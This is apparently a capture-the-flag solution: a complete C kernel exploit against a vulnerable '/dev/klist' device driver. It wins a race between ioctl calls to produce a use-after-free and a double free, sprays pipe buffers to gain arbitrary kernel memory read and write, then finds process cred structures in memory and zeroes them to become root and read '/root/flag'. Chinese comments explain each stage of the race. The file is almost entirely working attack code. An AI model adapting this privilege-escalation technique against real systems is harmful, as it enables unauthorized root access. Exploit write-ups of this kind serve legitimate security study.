#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <errno.h>
#include <linux/fs.h>
#include <semaphore.h>
#include <sys/prctl.h>
#include <sys/timerfd.h>
#include <sys/reg.h>

#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE);\
                        }while(0)

#define SIZE 0x280

typedef struct myargs{
    uint64_t size;
    uint64_t buf;
}myargs;

int fd; // klist fd 

void hexdump(char *buf, uint64_t size)
{
    for(int i=0; i<size; i+=0x10)
        printf("+%x:0x%lx       +%x:0x%lx\n", i, *(uint64_t*)(buf+i), i+8, *(uint64_t *)(buf+i+8));
}

int addItem(char *buf, uint64_t sz)
{
    myargs temp;
    temp.size = sz;
    temp.buf = (uint64_t)buf;
    return ioctl(fd, 0x1337, &temp);
}

int selectItem(uint64_t index)
{
    return ioctl(fd, 0x1338, index);
}

int removeItem(uint64_t index)
{
    return ioctl(fd, 0x1339, index);
}

int list_head(char *buf)
{
    return ioctl(fd, 0x133a, (uint64_t)buf);
}

void checkwin()
{
    while(1) {
        sleep(1);
        if (getuid() == 0){
            system("cat /root/flag");
            exit(0);
        }
    }
}

char buf0[SIZE];
char buf1[SIZE];
char buf2[SIZE];
char buf3[SIZE];

void myinit()
{
    fd=open("/dev/klist", O_RDWR);
    memset(buf0, 'A', SIZE);
    memset(buf1, 'B', SIZE);
    memset(buf2, 'C', SIZE);
    memset(buf3, 'D', SIZE);
}


int main()
{
    pid_t child_pid;
    myinit();
    
    addItem(buf0, SIZE-0x18); // 0
    selectItem(0);

    puts("race begin");
    child_pid = fork();
    if(child_pid == 0)
    {
        for (int i=0; i<200; i++)
        {
            child_pid = fork();
            if (child_pid == 0)
                checkwin();
        }
        while(1)
        {
            addItem(buf0, SIZE-0x18);   // 1  子进程list_head与这里竞争，如果竞争成功，这里新增的item会被free掉，cnt为0, 如果竞争不成功，cnt为1
            selectItem(0);            //     如果竞争成功，选中UAF的item，cnt为1，如果竞争不成功cnt为2
            removeItem(0);           // 如果竞争成功，会使得UAF item又被free一次，cnt=0，如果竞争不成功，item不会被free，cnt为1，list_head变为next item 
            addItem(buf1, SIZE-0x18);  //  2  如果竞争成功，UAF item被重新申请出来，被B填充，cnt=1，如果竞争失败，当前item为list head，被填充为B，cnt为1
            read(fd, buf2, SIZE-0x18);  //    如果竞争成功，当前1被选中，read之后B覆盖C，如果竞争不成功，A覆盖C。
            if (buf2[0] == 'B') {
                puts("race won!");
                break;
            }
            removeItem(0);          // 竞争失败，remove 2 item 
        }

        // 删除并添加管道来占据首个item 
        sleep(1);
        removeItem(0);        // 竞争成功，此时的list_head为UAF item，cnt为1，又会被free一次，freelist里面存在两个引用  
        memset(buf3, 'E', SIZE);
        int fds[2];
        pipe(&fds[0]);
        // 堆喷，使得uaf item 的size被覆盖，从而进行任意地址读写
        for(int i=0; i<9; i++)
            write(fds[1], buf3, SIZE);

        uint32_t *ibuf = (uint32_t *)malloc(0x1000000);
        read(fd, ibuf, 0x1000000);
        uint64_t max_i = 0;
        int count = 0;
        for(int i=0; i<0x1000000/4; i++)
        {
            if (ibuf[i] == 1000 && ibuf[i+1] == 1000 && ibuf[i+7] == 1000)
            {
                puts("[*] we got cred!");
                max_i = i+8;
                for(int j=0; j<8; j++)
                    ibuf[i+j] = 0;
                count++;
                if(count >= 2)
                    break;
            }
        }
        write(fd, ibuf, max_i*4);

        checkwin(); // 有可能时当前的进程的cred被写入
    }
    else if (child_pid > 0)
    {
        while(1) {
            if( list_head(buf3) ) 
                puts("list head faild!");
            read(fd, buf2, SIZE-0x18); // 如果竞争成功，被选中的item的content为B，竞争失败，item content为A
            if(buf2[0] == 'B') {
                puts("race won thread 2!");
                break;
            }
        }
        checkwin(); // 有可能是当前的进程cred被写入
    }
    else
    {
        errExit("[*] fork failed!");
        return -1;
    }
    return 0;
}



